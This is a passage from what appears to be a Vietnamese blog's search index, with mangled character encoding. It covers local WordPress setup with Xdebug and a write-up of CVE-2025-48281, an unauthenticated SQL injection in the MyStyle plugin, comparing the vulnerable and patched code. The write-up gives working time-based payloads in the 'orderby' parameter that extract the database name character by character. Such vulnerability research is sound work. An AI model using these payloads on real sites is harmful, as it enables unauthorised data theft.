quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin MyStyle Custom Product Designer c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.21.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48281 Product: WordPress MyStyle Custom Product Designer Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.21.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging MyStyle Custom Product Designer: v3.21.1(vul) v√† v3.21.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i MyStyle Custom Product Designer Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/entities/class-mystyle-designmanager.php\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $order = \u0026#39; ORDER BY \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order .= ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? \u0026#39; \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39; ASC\u0026#39;; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.1\u0026rdquo; }\nD·ªØ li·ªáu t·ª´ $_GET['orderby'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() v√† wp_unslash() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c lo·∫°i b·ªè k√Ω t·ª± ho·∫∑c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $orderby = sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order = ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39;ASC\u0026#39;; // Validate order direction to prevent SQL injection. $allowed_orderby = array( \u0026#39;ms_design_id\u0026#39;, \u0026#39;ms_title\u0026#39;, \u0026#39;ms_access\u0026#39;, \u0026#39;ms_email\u0026#39;, \u0026#39;ms_date_created\u0026#39;, \u0026#39;ms_date_modified\u0026#39;, ); $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : \u0026#39;ms_design_id\u0026#39;; $order = in_array( strtoupper( $order ), array( \u0026#39;ASC\u0026#39;, \u0026#39;DESC\u0026#39; ), true ) ? $order : \u0026#39;ASC\u0026#39;; $order = \u0026#39; ORDER BY \u0026#39; . $orderby . \u0026#39; \u0026#39; . $order; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng while list $allowed_orderby ƒë·ªÉ quy ƒë·ªãnh r√µ c√°c c·ªôt ƒë∆∞·ª£c ph√©p s·∫Øp x·∫øp. N·∫øu gi√° tr·ªã orderby kh√¥ng n·∫±m trong danh s√°ch h·ª£p l·ªá th√¨ s·∫Ω b·ªã thay th·∫ø b·∫±ng m·∫∑c ƒë·ªãnh 'ms_design_id' =\u0026gt; ch·∫∑n kh·∫£ nƒÉng ch√®n payload ƒë·ªôc l·∫°i.\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_designs c·ªßa class MyStyle_DesignManager thu·ªôc file includes/entities/class-mystyle-designmanager.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_designs trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_designs ƒë∆∞·ª£c g·ªçi trong get_items, init_index_request v√† c√°c h√†m test kh√¥ng ƒë√°ng quan t√¢m\nV√¨ ƒë√¢y l√† l·ªói h·ªïng unauthenticated n√™n c·∫ßn ki·ªÉm tra ch√≠nh x√°c h√†m n√†o kh√¥ng c·∫ßn x√°c th·ª±c ng∆∞·ªùi d√πng.\nget_items() Function get_items n·∫±m trong class MyStyle_Wp_Rest_Api_Design_Controller thu·ªôc file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. get_items ƒë∆∞·ª£c h√†m register_routes trong c√πng class s·ª≠ d·ª•ng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress.\npublic function register_routes() { $version = \u0026#39;2\u0026#39;; $vendor = \u0026#39;wc-mystyle\u0026#39;; $namespace = $vendor . \u0026#39;/v\u0026#39; . $version; $base = \u0026#39;designs\u0026#39;; register_rest_route( $namespace, \u0026#39;/\u0026#39; . $base, array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::READABLE, // GET \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items_permissions_check\u0026#39; ), \u0026#39;args\u0026#39; =\u0026gt; array(), ) ) ) // other logic } {: file=\u0026ldquo;includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php v3.21.1\u0026rdquo; }\nTuy nhi√™n tr∆∞·ªõc khi callback ƒë∆∞·ª£c g·ªçi, c·∫ßn ph·∫£i check permissions b·∫±ng h√†m get_items_permissions_check, ta c·∫ßn ph·∫£i bi·∫øt anonymoust user c√≥ ƒë∆∞·ª£c g·ªçi api n√†y kh√¥ng. T√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_items_permissions_check.\nüëâ get_items_permissions_check g·ªçi ƒë·∫øn wc_rest_check_manager_permissions ƒë·ªÉ ki·ªÉm tra quy·ªÅn v·ªõi $object = 'settings'. ƒê·ªÉ hi·ªÉu h√†m n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ th·∫ø n√†o, ta c·∫ßn t√¨m ki·∫øm theo t·ª´ kh√≥a wc_rest_check_manager_permissions trong to√†n b·ªô th∆∞ m·ª•c plugin, b·ªüi v√¨ h√†m n√†y kh√¥ng ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a tr·ª±c ti·∫øp trong plugin hi·ªán t·∫°i.\nwc_rest_check_manager_permissions ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong plugin WooCommerce settings mapping th√†nh manage_woocommerce G·ªçi current_user_can( 'manage_woocommerce' ) ƒë·ªÉ ki·ªÉm tra quy·ªÅn c·ªßa user =\u0026gt; Ch·ªâ Admin (ho·∫∑c user c√≥ quy·ªÅn manage_woocommerce). üëâ V√¨ v·∫≠y ta kh√¥ng th·ªÉ khai th√°c t·ª´ h√†m get_items =\u0026gt; khai th√°c h√†m t·ª´ h√†m init_index_request\ninit_index_request() Function init_index_request n·∫±m trong class MyStyle_Design_Profile_Page thu·ªôc file includes/pages/class-mystyle-design-profile-page.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. init_index_request ƒë∆∞·ª£c h√†m init trong c√πng class g·ªçi.\npublic function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Ch·ªâ ho·∫°t ƒë·ªông khi c√°c bi·∫øn trong POST request sau ƒë∆∞·ª£c truy·ªÅn =\u0026gt; kh√¥ng quan t√¢m if( isset( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ) \u0026amp;\u0026amp; wp_verify_nonce( sanitize_key( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ), \u0026#39;mystyle_delete_design_nonce\u0026#39; ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( \u0026#39;administrator\u0026#39; ) || MyStyle_DesignManager::is_user_design_owner( $this-\u0026gt;user-\u0026gt;ID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u0026gt;set_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u0026gt;delete_design_success_message = \u0026#39;Design has been successfully deleted.\u0026#39;; } } } if ( false === $design_id || preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_profile_page-\u0026gt;init_index_request(); } else { $design_profile_page-\u0026gt;init_design_request( $design_id ); } } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nƒê·ªÉ init_index_request ƒë∆∞·ª£c g·ªçi th√¨ c√¢u ƒëi·ªÅu ki·ªán if ph·∫£i x·∫£y ra, ta c·∫ßn ph·∫£i bi·∫øt $design_id l√† g√¨, t√¨m ki·∫øm h√†m get_design_id_from_url trong c√πng class, v√¨ n√≥ ƒë∆∞·ª£c g·ªçi b·∫±ng self v√† g√°n gi√° tr·ªã cho $design_id\npublic static function get_design_id_from_url() { // Try the query vars ( ex: \u0026amp;design_id=10 ). $design_id = get_query_var( \u0026#39;design_id\u0026#39; ); if ( preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /designs/10. -------- // phpcs:ignore $path = $_SERVER[\u0026#39;REQUEST_URI\u0026#39;]; // Get the design profile page\u0026#39;s WP_Post slug. /* @var $post \\WP_Post phpcs:ignore */ $post = get_post( self::get_id() ); $slug = $post-\u0026gt;post_name; $pattern = \u0026#39;/^.*\\/\u0026#39; . $slug . \u0026#39;\\/([\\d]+)/\u0026#39;; if ( preg_match( $pattern, $path, $matches ) ) { $design_id = $matches[1]; } else { $design_id = false; } // ------------------------------------- } return $design_id; } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nüëâ H√†m n√†y l·∫•y design_id t·ª´ url n√™n khi kh√¥ng th√™m n√≥ v√†o url khi g·ª≠i request =\u0026gt; if x·∫£y ra =\u0026gt; init_index_request ƒë∆∞·ª£c g·ªçi.\nQuay tr·ªü l·∫°i h√†m init, n√≥ ƒë∆∞·ª£c g·ªçi trong __construct c·ªßa c√πng class.\npublic function __construct() { // other logic add_action( \u0026#39;init\u0026#39;, array( \u0026amp;$this, \u0026#39;rewrite_rules\u0026#39; ) ); add_action( \u0026#39;template_redirect\u0026#39;, array( \u0026amp;$this, \u0026#39;init\u0026#39; ) ); } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\ninit l√† callback g·∫Øn v√†o hook template_redirect: l√† m·ªôt action hook trong WordPress, ch·∫°y tr∆∞·ªõc khi n·ªôi dung template th·ª±c s·ª± ƒë∆∞·ª£c load v√† hi·ªÉn th·ªã ra tr√¨nh duy·ªát.\nPh√≠a tr√™n hook template_redirect trong __construct c√≤n c√≥ hook init, n√≥ s·∫Ω ch·∫°y tr√™n m·ªói request v·ªõi callback rewrite_rules:\npublic function rewrite_rules() { // Flush rewrite rules for newly created rewrites. flush_rewrite_rules(); add_rewrite_rule( \u0026#39;designs/([a-zA-Z0-9_-].+)?$\u0026#39;, // designs/{slug} \u0026#39;index.php?pagename=designs\u0026amp;design_id=$matches[1]\u0026#39;, \u0026#39;top\u0026#39; ); } H√†m n√†y th√™m route /designs/{id} ƒë·ªÉ load trang designs v√† truy·ªÅn bi·∫øn design_id.\nüëâ Nh∆∞ v·∫≠y khi truy c·∫≠p v√†o /designs/:\nCallback rewrite_rules ƒë∆∞·ª£c g·ªçi, WordPress s·∫Ω load /index.php?pagename=designs\u0026amp;design_id=. design_id kh√¥ng c√≥ gi√° tr·ªã n√™n get_design_id_from_url ƒë∆∞·ª£c g√°n cho $design_id s·∫Ω l√† false =\u0026gt; ƒëi·ªÅu ki·ªán false === $design_id x·∫£y ra khi·∫øn init_index_request trong kh·ªëi if ƒë∆∞·ª£c g·ªçi. init_index_request g·ªçi ƒë·∫øn get_designs get_designs l·∫•y tr·ª±c ti·∫øp orderby t·ª´ GET request th√™m v√†o c√¢u query ƒë·ªÉ th·ª±c thi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nTrong tr∆∞·ªùng h·ª£p n√†y kh√¥ng n√™n comment ph√≠a sau SLEEP. V√¨ developer ƒë√£ enter khi·∫øn OFFSET xu·ªëng d√≤ng th·ª© 2, khi comment ho·∫°t ƒë·ªông, parser c·ªßa SQL s·∫Ω x·ª≠ l√Ω v√† tr·∫£ v·ªÅ l·ªói. {: .prompt-info }\nCu·ªói c√πng s·∫Ω ƒë∆∞·ª£c t√°ch th√†nh 2 c√¢u query ·ªü 2 d√≤ng kh√°c nhau g√¢y ra l·ªói:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25\tOFFSET 0 Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ orderby ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-48281 trong plugin WordPress MyStyle Custom Product Designer tr∆∞·ªõc phi√™n b·∫£n 3.21.2 xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai white list, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nKi·ªÉm 